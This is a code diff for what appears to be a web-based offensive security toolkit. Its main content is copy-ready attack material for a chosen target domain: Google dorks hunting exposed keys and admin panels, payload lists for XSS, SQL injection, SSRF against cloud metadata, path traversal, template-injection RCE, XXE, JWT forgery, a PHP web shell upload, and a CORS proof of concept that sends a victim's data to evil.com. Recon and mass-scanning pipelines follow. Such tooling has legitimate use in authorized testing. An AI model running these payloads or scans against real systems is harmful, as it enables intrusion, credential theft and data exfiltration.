+  return `<div class="workflow-box"><ol class="workflow-steps">${steps.map(s=>`<li>${escHtml(s)}</li>`).join('')}</ol></div>`;
+}
+
+function buildSection(num, icon, title, tags, cards, workflow) {
+  const metaIdx = sectionMeta.length;
+  // cards array contains HTML strings; cmdStore was already populated by buildCmdCard calls
+  // We snapshot start/end indices of cmdStore for this section
+  const endIdx = cmdStore.length; // all cmds pushed so far
+  const startIdx = endIdx - cards.length;
+  sectionMeta.push({ title, tags, startIdx, endIdx });
+  return `<div class="accordion-item" data-section-title="${escHtml(title.toLowerCase())}" data-section-tags="${escHtml(tags.join(' ').toLowerCase())}">
+    <div class="accordion-header" onclick="toggleAccordion(this)">
+      <div class="acc-left">
+        <span class="acc-num">${String(num).padStart(2,'0')}</span>
+        <span class="acc-icon">${icon}</span>
+        <span class="acc-title">${escHtml(title)}</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:0.5rem;flex-shrink:0;" onclick="event.stopPropagation()">
+        <button class="copy-all-btn" onclick="copyAllSection(this,${metaIdx})">COPY ALL</button>
+        <span class="acc-chevron" style="pointer-events:none;">▼</span>
+      </div>
+    </div>
+    <div class="accordion-body">
+      <div style="margin-top:0.5rem;">${tags.map(t=>`<span class="section-tag">${escHtml(t)}</span>`).join('')}</div>
+      <div class="cmd-grid">${cards.join('')}</div>
+      ${buildWorkflow(workflow)}
+    </div>
+  </div>`;
+}
+
+// ════════════════════════════════════════
+// ── GOOGLE DORKS TAB ──
+// ════════════════════════════════════════
+const DORK_DATA = [
+  { cat:'Subdomain Discovery', dorks:[
+    d => `site:*.${d} -www`,
+    d => `site:*.${d} -www -mail -vpn -remote`,
+    d => `site:${d} -site:www.${d}`,
+    d => `site:*.*.${d}`,
+  ]},
+  { cat:'Admin & Login Panels', dorks:[
+    d => `site:${d} inurl:admin OR inurl:login OR inurl:dashboard OR inurl:portal`,
+    d => `site:${d} inurl:admin/login`,
+    d => `site:${d} intitle:"admin panel" OR intitle:"control panel"`,
+    d => `site:${d} inurl:wp-admin OR inurl:wp-login`,
+    d => `site:${d} inurl:administrator`,
+    d => `site:${d} inurl:signin OR inurl:sso OR inurl:auth`,
+  ]},
+  { cat:'Sensitive File Exposure', dorks:[
+    d => `site:${d} ext:env OR ext:env.bak OR ext:env.old`,
+    d => `site:${d} ext:log OR ext:txt filetype:log`,
+    d => `site:${d} ext:sql OR ext:db OR ext:dump`,
+    d => `site:${d} ext:bak OR ext:old OR ext:backup`,
+    d => `site:${d} ext:conf OR ext:config OR ext:cfg OR ext:ini`,
+    d => `site:${d} ext:pem OR ext:key OR ext:ppk`,
+    d => `site:${d} ext:xls OR ext:xlsx OR ext:csv intitle:"password" OR intitle:"user"`,
+    d => `site:${d} filetype:pdf "confidential" OR "internal only"`,
+  ]},
+  { cat:'API & Docs Exposure', dorks:[
+    d => `site:${d} inurl:swagger OR inurl:api-docs OR inurl:openapi`,
+    d => `site:${d} inurl:/api/ -docs -swagger`,
+    d => `site:${d} inurl:graphql OR inurl:graphiql`,
+    d => `site:${d} intitle:"swagger ui" OR intitle:"api documentation"`,
+    d => `site:${d} inurl:v1 OR inurl:v2 OR inurl:v3 inurl:api`,
+    d => `site:${d} inurl:docs/api OR inurl:developer OR inurl:developers`,
+  ]},
+  { cat:'Error Pages & Debug', dorks:[
+    d => `site:${d} intext:"fatal error" OR intext:"stack trace" OR intext:"exception"`,
+    d => `site:${d} intext:"sql syntax" OR intext:"mysql error" OR intext:"ORA-"`,
+    d => `site:${d} intext:"index of" intitle:"index of"`,
+    d => `site:${d} intext:"debug" inurl:debug`,
+    d => `site:${d} intext:"Warning: mysql_" OR intext:"You have an error in your SQL"`,
+    d => `site:${d} intext:"phpinfo()" OR intitle:"PHP Info"`,
+  ]},
+  { cat:'Cloud & Storage', dorks:[
+    d => `site:s3.amazonaws.com "${d}"`,
+    d => `site:blob.core.windows.net "${d}"`,
+    d => `site:storage.googleapis.com "${d}"`,
+    d => `site:${d} inurl:s3.amazonaws.com`,
+    d => `"${d}" site:pastebin.com`,
+    d => `"${d}" site:trello.com password OR token OR api_key`,
+    d => `"${d}" site:github.com password OR secret OR apikey`,
+  ]},
+  { cat:'Source Code Leaks', dorks:[
+    d => `"${d}" site:github.com`,
+    d => `"${d}" site:gitlab.com`,
+    d => `"${d}" site:bitbucket.org`,
+    d => `"${d}" DB_PASSWORD OR DB_HOST OR SECRET_KEY`,
+    d => `"${d}" "BEGIN RSA PRIVATE KEY"`,
+    d => `"${d}" intext:"api_key" OR intext:"access_token"`,
+  ]},
+  { cat:'Vulnerable Parameters', dorks:[
+    d => `site:${d} inurl:"?id=" OR inurl:"?user=" OR inurl:"?cat="`,
+    d => `site:${d} inurl:"?page=" OR inurl:"?file=" OR inurl:"?path="`,
+    d => `site:${d} inurl:"?redirect=" OR inurl:"?url=" OR inurl:"?next="`,
+    d => `site:${d} inurl:"?q=" OR inurl:"?search=" OR inurl:"?query="`,
+    d => `site:${d} inurl:"?token=" OR inurl:"?key=" OR inurl:"?api="`,
+  ]},
+  { cat:'Juicy Intel', dorks:[
+    d => `site:${d} intitle:"index of" "parent directory"`,
+    d => `site:${d} intext:"username" intext:"password" filetype:txt`,
+    d => `site:${d} "not for distribution" OR "internal use only"`,
+    d => `site:linkedin.com "${d}" employees`,
+    d => `"@${d}" filetype:xls OR filetype:csv`,
+    d => `"${d}" "employee" site:linkedin.com`,
+  ]},
+];
+
+let activeDorkCat = 'All';
+
+const dorkStore = [];
+function renderDorks() {
+  dorkStore.length = 0;
+  const dom = (document.getElementById('dorkDomain').value.trim().replace(/[^a-zA-Z0-9.\-]/g,'')) || 'target.com';
+  const cats = ['All', ...DORK_DATA.map(d=>d.cat)];
+  document.getElementById('dorkFilters').innerHTML = cats.map(cat =>
+    `<button class="dork-filter ${cat===activeDorkCat?'active':''}" onclick="setDorkCat('${cat.replace(/&/g,'&amp;').replace(/'/g,"\\'")}') ">${escHtml(cat)}</button>`
+  ).join('');
+  const filtered = activeDorkCat === 'All' ? DORK_DATA : DORK_DATA.filter(d => d.cat === activeDorkCat);
+  let html = '';
+  filtered.forEach(group => {
+    group.dorks.forEach(fn => {
+      const q = fn(dom);
+      const idx = dorkStore.length;
+      dorkStore.push(q);
+      html += `<div class="dork-card">
+        <div class="dork-cat"><span>${escHtml(group.cat)}</span>
+          <button class="mini-copy" onclick="miniCopyDork(this,${idx})">COPY</button>
+        </div>
+        <div class="dork-query">${escHtml(q)}</div>
+      </div>`;
+    });
+  });
+  document.getElementById('dorkGrid').innerHTML = html;
+}
+function miniCopyDork(btn, idx) { miniCopy(btn, dorkStore[idx]); }
+
+function setDorkCat(cat) { activeDorkCat = cat; renderDorks(); }
+
+// ════════════════════════════════════════
+// ── PAYLOADS TAB ──
+// ════════════════════════════════════════
+const PAYLOAD_DATA = [
+  { cat:'🔥 XSS — Reflected / Stored (2024-25 Bypass Focus)', items:[
+    { label:'Basic alert (always try first)', code:'\x3cscript>alert(document.domain)\x3c\/script>' },
+    { label:'IMG onerror', code:'<img src=x onerror=alert(document.domain)>' },
+    { label:'SVG onload (bypasses many filters)', code:'<svg onload=alert(document.domain)>' },
+    { label:'Polyglot — works across many contexts', code:'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(document.domain))//%0D%0A%0d%0a//\x3c/style/\x3c/title/\x3c/script/--!><sVg/oNloAd=alert(document.domain)//' },
+    { label:'Template literal (JS context)', code:'${alert(document.domain)}' },
+    { label:'href/src attribute context', code:'javascript:alert(document.domain)' },
+    { label:'Filter bypass — double encoding', code:'%253Cscript%253Ealert(1)%253C%252Fscript%253E' },
+    { label:'Filter bypass — case variation', code:'\x3cscript>alert(1)\x3c/script>' },
+    { label:'AngularJS sandbox escape (1.x)', code:'{{constructor.constructor(\'alert(1)\')()}}' },
+    { label:'Blind XSS — use xsshunter.com', code:'">\x3cscript src="https://YOUR.xss.ht">\x3c\/script>' },
+    { label:'DOM XSS via hash', code:'#"><img src=x onerror=alert(1)>' },
+    { label:'mXSS — mutation-based', code:'<listing>&lt;img/src=x onerror=alert(1)&gt;' },
+  ]},
+  { cat:'💉 SQL Injection — Detection & Bypass', items:[
+    { label:'Classic error-based detection', code:"' OR '1'='1" },
+    { label:'Boolean-based blind', code:"' AND 1=1--\n' AND 1=2--" },
+    { label:'Time-based blind (MySQL)', code:"' AND SLEEP(5)--\n'; WAITFOR DELAY '0:0:5'--" },
+    { label:'Union-based — find column count', code:"' ORDER BY 1--\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--" },
+    { label:'Union dump — MySQL', code:"' UNION SELECT 1,database(),3,user(),version()--" },
+    { label:'Error-based extractvalue (MySQL)', code:"' AND extractvalue(1,concat(0x7e,(SELECT version())))--" },
+    { label:'WAF bypass — inline comments', code:"' /*!UNION*/ /*!SELECT*/ 1,2,3--" },
+    { label:'WAF bypass — URL encoding', code:"%27%20OR%20%271%27%3D%271" },
+    { label:'NoSQL injection (MongoDB)', code:'{"username": {"$gt": ""}, "password": {"$gt": ""}}' },
+    { label:'NoSQL — query operator abuse', code:'username[$ne]=invalid&password[$ne]=invalid' },
+    { label:'Second-order SQLi indicator', code:"admin'--" },
+  ]},
+  { cat:'🌐 SSRF — Payloads & Bypasses', items:[
+    { label:'AWS metadata v1', code:'http://169.254.169.254/latest/meta-data/' },
+    { label:'AWS metadata v2 — token + use (IMDSv2)', code:'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\ncurl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/' },
+    { label:'GCP metadata', code:'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' },
+    { label:'Azure metadata', code:'http://169.254.169.254/metadata/instance?api-version=2021-02-01' },
+    { label:'Localhost bypass variants', code:'http://localhost/\nhttp://127.0.0.1/\nhttp://[::1]/\nhttp://0.0.0.0/\nhttp://0177.0.0.1/' },
+    { label:'IP decimal bypass', code:'http://2130706433/' },
+    { label:'IPv6 mapped bypass', code:'http://[::ffff:169.254.169.254]/latest/meta-data/' },
+    { label:'DNS rebinding bait', code:'http://169.254.169.254.nip.io/latest/meta-data/' },
+    { label:'Gopher protocol (Redis)', code:'gopher://127.0.0.1:6379/_INFO%0D%0A' },
+    { label:'File read via SSRF', code:'file:///etc/passwd' },
+    { label:'Open redirect chain for SSRF', code:'https://target.com/redirect?url=http://169.254.169.254/' },
+  ]},
+  { cat:'📂 LFI / Path Traversal', items:[
+    { label:'Basic traversal', code:'../../../etc/passwd' },
+    { label:'URL encoded', code:'..%2F..%2F..%2Fetc%2Fpasswd' },
+    { label:'Double encoded', code:'..%252F..%252F..%252Fetc%252Fpasswd' },
+    { label:'Null byte (legacy PHP)', code:'../../../etc/passwd%00' },
+    { label:'Dotdotslash variations', code:'....//....//....//etc/passwd\n..././..././..././etc/passwd' },
+    { label:'Linux sensitive files', code:'/etc/passwd\n/etc/shadow\n/proc/self/environ\n/proc/self/cmdline\n/var/log/apache2/access.log\n/var/log/nginx/access.log' },
+    { label:'PHP wrappers', code:'php://filter/convert.base64-encode/resource=index.php\nphp://input\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=' },
+  ]},
+  { cat:'🖥️ SSTI — Template Injection', items:[
+    { label:'Detection polyglot', code:"${{<%[%'\"}}%\\." },
+    { label:'Jinja2 (Flask) — detect', code:'{{7*7}} → 49' },
+    { label:'Jinja2 — RCE', code:"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" },
+    { label:'Twig (PHP) — detect', code:"{{7*'7'}} → 7777777" },
+    { label:'Twig — RCE', code:'{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}' },
+    { label:'Freemarker (Java) — detect + RCE', code:'${7*7} → 49\n<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' },
+    { label:'ERB (Ruby) — detect + RCE', code:'<%= 7*7 %> → 49\n<%= system("id") %>' },
+    { label:'Smarty (PHP) — RCE', code:"{system('id')}" },
+  ]},
+  { cat:'🔑 XXE — External Entity', items:[
+    { label:'Classic file read', code:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' },
+    { label:'Blind OOB (DNS/HTTP exfil)', code:'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_COLLAB.oast.pro/xxe">%xxe;]>' },
+    { label:'SVG XXE (file upload)', code:'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>' },
+    { label:'XInclude (when DOCTYPE blocked)', code:'<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>' },
+  ]},
+  { cat:'🔐 JWT Attacks', items:[
+    { label:'alg:none bypass header (base64)', code:'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0' },
+    { label:'alg:none full token structure', code:'HEADER_B64.PAYLOAD_B64.' },
+    { label:'RS256 → HS256 confusion', code:'# Sign HS256 with RSA public key as secret\npython3 jwt_tool.py TOKEN -X k -pk public.pem' },
+    { label:'kid injection — SQL', code:'{"kid": "\' UNION SELECT \'hacked\'--","alg":"HS256"}' },
+    { label:'kid injection — path traversal', code:'{"kid": "../../../../dev/null","alg":"HS256"}' },
+    { label:'Weak secret bruteforce', code:'hashcat -a 0 -m 16500 HEADER.PAYLOAD.SIG /usr/share/wordlists/rockyou.txt' },
+    { label:'jwt_tool — all attacks auto', code:'python3 jwt_tool.py TOKEN -M at -t "https://target.com/api/me"' },
+  ]},
+  { cat:'🌍 CORS — Test Payloads', items:[
+    { label:'Arbitrary origin check', code:'Origin: https://evil.com' },
+    { label:'Null origin (sandboxed iframes)', code:'Origin: null' },
+    { label:'Pre-domain match bypass', code:'Origin: https://eviltarget.com' },
+    { label:'Post-domain match bypass', code:'Origin: https://target.com.evil.com' },
+    { label:'HTTP origin (target is HTTPS)', code:'Origin: http://target.com' },
+    { label:'CORS PoC JavaScript', code:"fetch('https://target.com/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.com/?d='+btoa(d)))" },
+  ]},
+  { cat:'🚇 HTTP Request Smuggling', items:[
+    { label:'CL.TE smuggle payload', code:'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' },
+    { label:'TE.CL smuggle payload', code:'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' },
+    { label:'TE.TE obfuscation variants', code:'Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\n---\nTransfer-Encoding: xchunked\n---\nTransfer-Encoding : chunked' },
+    { label:'H2.CL (Burp HTTP/2 mode)', code:':method: POST\n:path: /\ncontent-length: 0\n\nGET /admin HTTP/1.1\nHost: target.com\nContent-Length: 10\n\nx=' },
+  ]},
+  { cat:'⚡ GraphQL Attacks', items:[
+    { label:'Introspection query (full schema)', code:'{"query":"{__schema{types{name fields{name args{name}}}}}"}' },
+    { label:'Quick introspection check', code:'{"query":"{__typename}"}' },
+    { label:'Batch attack (rate limit bypass)', code:'[{"query":"mutation{login(u:\\"admin\\",p:\\"111\\")}"},{"query":"mutation{login(u:\\"admin\\",p:\\"222\\")}"},{"query":"mutation{login(u:\\"admin\\",p:\\"333\\")}"}]' },
+    { label:'IDOR via GraphQL object ID', code:'{"query":"{order(id:\\"VICTIM_ID\\"){total items{name}customer{email}}}"}' },
+    { label:'Alias batching (IDOR mass harvest)', code:'{"query":"{a:user(id:1){email} b:user(id:2){email} c:user(id:3){email}}"}' },
+    { label:'Mutation privilege escalation', code:'{"query":"mutation{updateUser(id:\\"victim\\",role:\\"admin\\"){id role}}"}' },
+    { label:'Field suggestion (discover hidden fields)', code:'{"query":"{user{passwrd}}"}  // typo triggers suggestion' },
+  ]},
+  { cat:'🔀 Open Redirect', items:[
+    { label:'Basic redirect', code:'?url=https://evil.com' },
+    { label:'Double slash bypass', code:'?url=//evil.com' },
+    { label:'Backslash bypass', code:'?url=https:\\\\evil.com' },
+    { label:'@-trick', code:'?url=https://target.com@evil.com' },
+    { label:'Fragment bypass', code:'?url=https://evil.com#target.com' },
+    { label:'Whitelisted subdomain abuse', code:'?url=https://evil.target.com.evil.com' },
+  ]},
+  { cat:'📤 File Upload Bypass', items:[
+    { label:'PHP extensions to try', code:'.php .php3 .php4 .php5 .php7 .phtml .phar .phps .shtml .pht' },
+    { label:'Double extension', code:'shell.jpg.php\nshell.php.jpg\nshell.php%00.jpg' },
+    { label:'MIME type bypass', code:'Content-Type: image/jpeg  (with .php file)' },
+    { label:'Magic bytes bypass (add JPEG header)', code:'ÿØÿà <?php system($_GET[\'cmd\']); ?>' },
+    { label:'SVG XSS via upload', code:'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>' },
+    { label:'XXE via SVG upload', code:'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>' },
+  ]},
+  { cat:'🛡️ WAF Bypass — Universal', items:[
+    { label:'Case variation', code:'SeLeCt * FrOm uSeRs' },
+    { label:'Comment injection (MySQL)', code:'SE/**/LECT/**/ 1,2,3' },
+    { label:'URL double encode', code:'%2527 instead of %27 (single quote)' },
+    { label:'HTTP parameter pollution', code:'?id=1&id=2 UNION SELECT 1,2--' },
+    { label:'Unicode normalization bypass', code:'ʼ (U+02BC) instead of apostrophe' },
+    { label:'Null byte injection', code:'%00 before payload' },
+    { label:'Buffer overflow WAF crash', code:'A*1000 then payload (overflow inspection buffer)' },
+  ]},
+];
+
+const payloadStore = [];
+function miniCopyIdx(btn,idx){miniCopy(btn,payloadStore[idx]);}
+function renderPayloads() {
+  payloadStore.length = 0;
+  let html = '';
+  PAYLOAD_DATA.forEach(section => {
+    html += `<div class="payload-cat-header"><span>${escHtml(section.cat)}</span></div><div class="payload-grid">`;
+    section.items.forEach(item => {
+      const idx = payloadStore.length;
+      payloadStore.push(item.code);
+      html += `<div class="payload-card">
+        <div class="payload-label"><span>${escHtml(item.label)}</span>
+          <button class="mini-copy" onclick="miniCopyIdx(this,${idx})">COPY</button>
+        </div>
+        <div class="payload-code">${escHtml(item.code)}</div>
+      </div>`;
+    });
+    html += `</div>`;
+  });
+  document.getElementById('payloadContainer').innerHTML = html;
+}
+
+// ════════════════════════════════════════
+// ── WILDCARD TAB ──
+// ════════════════════════════════════════
+function wc(str, base) { return str.replace(/BASE/g, base); }
+
+const wildStore = [];
+function wildCard(desc, raw, base) {
+  const cmd = wc(raw, base);
+  const idx = wildStore.length;
+  wildStore.push(cmd);
+  return `<div class="wild-cmd-card">
+    <div class="wild-cmd-header">
+      <span class="wild-cmd-desc">${escHtml(desc)}</span>
+      <button class="mini-copy" onclick="miniCopyIdx2(this,${idx})">COPY</button>
+    </div>
+    <div class="wild-cmd-code">${escHtml(cmd)}</div>
+  </div>`;
+}
+function miniCopyIdx2(btn, idx) { miniCopy(btn, wildStore[idx]); }
+
+function renderWild() {
+  wildStore.length = 0;
+  const base = (document.getElementById('wildcardBase').value.trim().replace(/[^a-zA-Z0-9.\-]/g,'')) || 'example.com';
+  const secs = [
+    { title:'🔍 Massive Passive Subdomain Harvest', cmds:[
+      wildCard('Subfinder — all sources', `subfinder -d BASE -all -silent -o subfinder_BASE.txt`, base),
+      wildCard('crt.sh — certificate transparency wildcard', `curl -s "https://crt.sh/?q=%25.BASE&output=json" | jq -r '.[].name_value' | sort -u | grep -v '*' | tee crt_BASE.txt`, base),
+      wildCard('gau + wayback on wildcard scope', `echo BASE | gau --subs | grep -oP '^https?://[^/]+' | sort -u | sed 's|https\\?://||' | tee gau_subs_BASE.txt`, base),
+      wildCard('Combine all passive sources', `cat subfinder_BASE.txt crt_BASE.txt gau_subs_BASE.txt | sort -u | tee all_passive_BASE.txt && echo "Total: $(wc -l < all_passive_BASE.txt)"`, base),
+    ]},
+    { title:'⚡ Active DNS Brute-Force (Wildcard-Safe)', cmds:[
+      wildCard('Detect wildcard DNS first (must do!)', `dig A randomxyz123abc.BASE +short && dig A randomxyz456def.BASE +short\n# If both return same IP = wildcard DNS exists = use puredns to filter`, base),
+      wildCard('puredns — wildcard-filtered brute-force', `puredns bruteforce /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt BASE -r resolvers.txt --wildcard-tests 5 -w puredns_BASE.txt`, base),
+      wildCard('dnsx — filter wildcards from results', `cat puredns_BASE.txt | dnsx -silent -a -resp-only -filter-wildcard -o dnsx_filtered_BASE.txt`, base),
+      wildCard('alterx — permutation on discovered subs', `cat all_passive_BASE.txt | alterx -enrich | dnsx -silent -resp-only | anew all_passive_BASE.txt`, base),
+      wildCard('dnsgen permutations + massdns resolve', `cat all_passive_BASE.txt | dnsgen - | massdns -r resolvers.txt -t A -o S | grep 'NOERROR' | awk '{print $1}' | sed 's/\.$//' | tee dnsgen_BASE.txt`, base),
+      wildCard('Merge all + final live resolve', `cat all_passive_BASE.txt puredns_BASE.txt dnsgen_BASE.txt | sort -u | dnsx -silent -a -resp-only | tee all_live_BASE.txt && echo "Live: $(wc -l < all_live_BASE.txt)"`, base),
+    ]},
+    { title:'🌐 Mass HTTP Probing & Visual Recon', cmds:[
+      wildCard('httpx — probe all subs with metadata', `cat all_live_BASE.txt | httpx -silent -status-code -title -tech-detect -content-length -follow-redirects -o httpx_all_BASE.txt -threads 100`, base),
+      wildCard('Filter 200/401/403 interesting targets', `cat httpx_all_BASE.txt | grep -E " 200 | 401 | 403 " | tee httpx_interesting_BASE.txt`, base),
+      wildCard('gowitness — screenshot all live hosts', `gowitness file -f httpx_all_BASE.txt --screenshot-path ./screens_BASE/ --report-path ./screens_BASE/report.html`, base),
+      wildCard('Find high-value subdomains auto', `cat httpx_all_BASE.txt | grep -iE 'admin|portal|api|dev|staging|jenkins|grafana|kibana|jira|sonar|gitlab|vpn|remote|internal' | tee highval_BASE.txt`, base),
+    ]},
+    { title:'🎯 Wildcard Takeover Hunting', cmds:[
+      wildCard('Extract ALL CNAME records', `cat all_live_BASE.txt | dnsx -silent -cname -resp | awk '{print $1, $NF}' | tee cnames_BASE.txt`, base),
+      wildCard('Filter dangerous cloud CNAMEs', `cat cnames_BASE.txt | grep -iE 'amazonaws|github\.io|heroku|shopify|fastly|netlify|azurewebsites|ghost\.io|zendesk|statuspage' | tee takeover_candidates_BASE.txt`, base),
+      wildCard('subjack — auto takeover check', `subjack -w all_live_BASE.txt -t 100 -timeout 30 -ssl -c ~/fingerprints.json -o subjack_BASE.txt`, base),
+      wildCard('nuclei takeover templates — mass check', `nuclei -l all_live_BASE.txt -t ~/nuclei-templates/http/takeovers/ -o nuclei_takeover_BASE.txt -stats`, base),
+      wildCard('NXDOMAIN check — dead DNS entries', `cat all_passive_BASE.txt | dnsx -silent -rcode nxdomain | tee nxdomain_BASE.txt`, base),
+    ]},
+    { title:'🤖 Full Automation Pipeline (One-Shot)', cmds:[
+      wildCard('Passive → active → httpx → nuclei → alert', `subfinder -d BASE -silent -all | anew all_BASE.txt | dnsx -silent -a -resp-only | anew live_BASE.txt | httpx -silent | nuclei -t ~/nuclei-templates/ -severity critical,high | notify`, base),
+      wildCard('Daily cron monitoring (paste in crontab -e)', `0 7 * * * subfinder -d BASE -silent -all | anew ~/monitor/BASE.txt | httpx -silent | nuclei -severity critical,high -o ~/monitor/findings_BASE.txt | notify -provider telegram`, base),
+      wildCard('New subdomain Slack alert', `subfinder -d BASE -silent | anew ~/subs_BASE.txt | httpx -silent -title -status-code | notify -provider slack`, base),
+      wildCard('JS monitoring — new secrets alert', `cat all_live_BASE.txt | httpx -silent | katana -jc -silent | grep '\.js$' | anew js_BASE.txt | xargs -I{} bash -c 'curl -sk "{}" | grep -Eo "(api_key|token|secret|password)[=:][a-zA-Z0-9_-]{16,}"' | tee secrets_BASE.txt | notify`, base),
+      wildCard('nuclei — new templates daily scan', `nuclei -l live_BASE.txt -nt -severity critical,high | notify -provider telegram`, base),
+    ]},
+    { title:'🗺️ IP & ASN Mapping', cmds:[
+      wildCard('asnmap — all CIDR ranges for org', `asnmap -d BASE -silent | tee asn_ranges_BASE.txt`, base),
+      wildCard('masscan — full port scan across IP ranges', `masscan -iL asn_ranges_BASE.txt -p0-65535 --rate 5000 -oL masscan_BASE.txt`, base),
+      wildCard('httpx on masscan results', `cat masscan_BASE.txt | awk '/open/{print $4":"$3}' | httpx -silent -status-code -title | tee httpx_ips_BASE.txt`, base),
+      wildCard('Find origin IPs behind Cloudflare', `cat all_live_BASE.txt | dnsx -silent -a -resp | awk '{print $NF}' | sort -u | grep -vE '^(104|103|172|141|190|198)\.' | tee origin_ips_BASE.txt`, base),
+      wildCard('Shodan org search for shadow IT', `shodan search org:"BASE" --fields ip_str,port,product | tee shodan_BASE.txt`, base),
+    ]},
+  ];
+  let html = '';
+  secs.forEach(s => {
+    html += `<div class="wild-section-title">${escHtml(s.title)}</div>`;
+    s.cmds.forEach(c => { html += c; });
+  });
+  document.getElementById('wildContent').innerHTML = html;
+}
+
+// ════════════════════════════════════════
+// ── ARSENAL SECTIONS ──
+// ════════════════════════════════════════
+function renderAccordion() {
+  const D = 'DOMAIN';
+  sectionMeta.length = 0;
+  const sections = [];
+
+  sections.push(buildSection(1,'🔍','Passive Recon & OSINT',['OSINT','crt.sh','Shodan','Wayback','Google Dorks','whois'],[
+    buildCmdCard('crt.sh — certificate transparency subdomain enum',`curl -s "https://crt.sh/?q=%25.${D}&output=json" | jq -r '.[].name_value' | sort -u | tee crt_${D}.txt`),
+    buildCmdCard('Subfinder — passive multi-source enum',`subfinder -d ${D} -silent -all -o subfinder_${D}.txt`),
+    buildCmdCard('Amass passive — OSINT sources',`amass enum -passive -d ${D} -o amass_passive_${D}.txt`),
+    buildCmdCard('theHarvester — emails, employees, hosts',`theHarvester -d ${D} -l 500 -b all -f harvest_${D}.html`),
+    buildCmdCard('WHOIS lookup',`whois ${D} | tee whois_${D}.txt`),
+    buildCmdCard('Shodan — hosts by domain',`shodan search "hostname:${D}" --fields ip_str,port,org,product | tee shodan_${D}.txt`),
+    buildCmdCard('Wayback Machine — historical URLs',`waybackurls ${D} | tee wayback_${D}.txt`),
+    buildCmdCard('gau — fetch all known URLs (Wayback+CommonCrawl+OTX)',`gau --subs ${D} | tee gau_${D}.txt`),
+    buildCmdCard('Google dork — exposed subdomains',`site:*.${D} -www`),
+    buildCmdCard('Google dork — login & admin panels',`site:${D} inurl:admin OR inurl:login OR inurl:dashboard OR inurl:portal`),
+    buildCmdCard('Google dork — config & env files',`site:${D} ext:env OR ext:conf OR ext:config OR ext:cfg OR ext:ini`),
+    buildCmdCard('Google dork — source code leaks on GitHub',`"${D}" site:github.com password OR secret OR api_key OR token`),
+    buildCmdCard('ASN lookup via bgp.he.net',`curl -s "https://bgp.he.net/dns/${D}" | grep -oP 'AS[0-9]+' | sort -u`),
+    buildCmdCard('DNSDumpster passive recon',`curl -s "https://api.hackertarget.com/hostsearch/?q=${D}" | tee dnsdumpster_${D}.txt`),
+  ],[
+    'Start with crt.sh + subfinder — widest passive coverage, zero noise.',
+    'Run Google dorks in Incognito — screenshot all findings.',
+    'waybackurls + gau for historical URL discovery — old endpoints = hidden attack surface.',
+    'Check GitHub/GitLab for leaked creds, API keys, configs mentioning the domain.',
+    'Save all outputs — combine later: cat *.txt | sort -u',
+  ]));
+
+  sections.push(buildSection(2,'🌐','Active Subdomain Enumeration',['DNS Brute','puredns','dnsx','massdns','alterx'],[
+    buildCmdCard('puredns — brute-force with wildcard filtering',`puredns bruteforce /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt ${D} -r resolvers.txt -w puredns_${D}.txt`),
+    buildCmdCard('massdns — high-performance resolver',`massdns -r resolvers.txt -t A -o S -w massdns_${D}.txt wordlist_${D}.txt`),
+    buildCmdCard('dnsx — DNS probe with CNAME/MX/NS extraction',`cat all_subs_${D}.txt | dnsx -silent -a -cname -mx -ns -resp -o dnsx_${D}.txt`),
+    buildCmdCard('Gobuster DNS brute-force',`gobuster dns -d ${D} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50 -o gobuster_dns_${D}.txt`),
+    buildCmdCard('alterx — permutation-based generation',`cat subfinder_${D}.txt | alterx | dnsx -silent -resp-only -o alterx_${D}.txt`),
+    buildCmdCard('dnsgen + massdns — alteration bruteforce',`cat subfinder_${D}.txt | dnsgen - | massdns -r resolvers.txt -t A -o S -w dnsgen_${D}.txt`),
+    buildCmdCard('Zone transfer attempt (AXFR)',`for ns in $(dig +short NS ${D}); do dig axfr ${D} @$ns; done`),
+    buildCmdCard('Merge all subs — final deduplicated list',`cat crt_${D}.txt subfinder_${D}.txt amass_passive_${D}.txt puredns_${D}.txt dnsgen_${D}.txt | sort -u | tee all_subs_${D}.txt && wc -l all_subs_${D}.txt`),
+    buildCmdCard('Resolve all — filter live A records only',`cat all_subs_${D}.txt | dnsx -silent -resp-only -a | tee resolved_${D}.txt`),
+  ],[
+    'Collect passive subs first, then puredns for active brute-force.',
+    'Use high-quality resolvers (github.com/trickest/resolvers) to avoid false positives.',
+    'Run alterx + dnsgen on discovered subs — finds hidden permutations (dev2, api-v2, etc.).',
+    'dnsx CNAME extraction is critical for takeover hunting (Section 8).',
+    'Zone transfer still succeeds on misconfigured setups — always try.',
+  ]));
+
